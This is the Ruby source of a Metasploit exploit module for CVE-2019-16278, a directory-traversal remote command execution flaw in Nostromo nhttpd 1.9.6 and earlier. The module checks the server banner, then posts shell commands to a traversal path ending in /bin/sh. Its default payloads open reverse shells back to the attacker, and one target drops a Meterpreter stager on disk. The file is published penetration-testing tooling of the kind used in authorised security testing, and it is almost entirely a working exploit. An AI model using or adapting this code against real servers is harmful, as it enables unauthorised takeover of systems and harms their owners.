`##  
# This module requires Metasploit: https://metasploit.com/download  
# Current source: https://github.com/rapid7/metasploit-framework  
##  
  
class MetasploitModule < Msf::Exploit::Remote  
Rank = GoodRanking  
  
include Msf::Exploit::CmdStager  
include Msf::Exploit::Remote::HttpClient  
  
def initialize(info = {})  
super(update_info(info,  
'Name' => 'Nostromo Directory Traversal Remote Command Execution',  
'Description' => %q{  
This module exploits a remote command execution vulnerability in  
Nostromo <= 1.9.6. This issue is caused by a directory traversal  
in the function `http_verify` in nostromo nhttpd allowing an attacker  
to achieve remote code execution via a crafted HTTP request.  
},  
'Author' =>  
[  
'Quentin Kaiser <kaiserquentin[at]gmail.com>', # metasploit module  
'sp0re', # original public exploit  
],  
'License' => MSF_LICENSE,  
'References' =>  
[  
[ 'CVE', '2019-16278'],  
[ 'URL', 'https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html'],  
],  
'Platform' => ['linux', 'unix'], # OpenBSD, FreeBSD, NetBSD, and Linux  
'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],  
'Targets' =>  
[  
['Automatic (Unix In-Memory)',  
{  
'Platform' => 'unix',  
'Arch' => ARCH_CMD,  
'Type' => :unix_memory,  
'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'}  
}  
],  
['Automatic (Linux Dropper)',  
{  
'Platform' => 'linux',  
'Arch' => [ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],  
'Type' => :linux_dropper,  
'DefaultOptions' => {'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'}  
}  
]  
],  
'DisclosureDate' => 'Oct 20 2019',  
'DefaultTarget' => 0,  
'Notes' => {  
'Stability' => [CRASH_SAFE],  
'Reliability' => [REPEATABLE_SESSION],  
'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]  
}  
))  
  
register_advanced_options([  
OptBool.new('ForceExploit', [false, 'Override check result', false])  
])  
end  
  
def check  
res = send_request_cgi({  
'method' => 'GET',  
'uri' => normalize_uri(target_uri.path),  
}  
)  
  
unless res  
vprint_error("Connection failed")  
return CheckCode::Unknown  
end  
  
if res.code == 200 and res.headers['Server'] =~ /nostromo [\d.]{5}/  
/nostromo (?<version>[\d.]{5})/ =~ res.headers['Server']  
if Gem::Version.new(version) <= Gem::Version.new('1.9.6')  
return CheckCode::Appears  
end  
end  
  
return CheckCode::Safe  
end  
  
def execute_command(cmd, opts = {})  
send_request_cgi({  
'method' => 'POST',  
'uri' => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),  
'headers' => {'Content-Length:' => '1'},  
'data' => "echo\necho\n#{cmd} 2>&1"  
}  
)  
end  
  
def exploit  
# These CheckCodes are allowed to pass automatically  
checkcodes = [  
CheckCode::Appears,  
CheckCode::Vulnerable  
]  
  
unless checkcodes.include?(check) || datastore['ForceExploit']  
fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')  
end  
  
print_status("Configuring #{target.name} target")  
  
case target['Type']  
when :unix_memory  
print_status("Sending #{datastore['PAYLOAD']} command payload")  
vprint_status("Generated command payload: #{payload.encoded}")  
  
res = execute_command(payload.encoded)  
  
if res && datastore['PAYLOAD'] == 'cmd/unix/generic'  
print_warning('Dumping command output in full response body')  
  
if res.body.empty?  
print_error('Empty response body, no command output')  
return  
end  
  
print_line(res.body)  
end  
when :linux_dropper  
print_status("Sending #{datastore['PAYLOAD']} command stager")  
execute_cmdstager  
end  
end  
end  
`


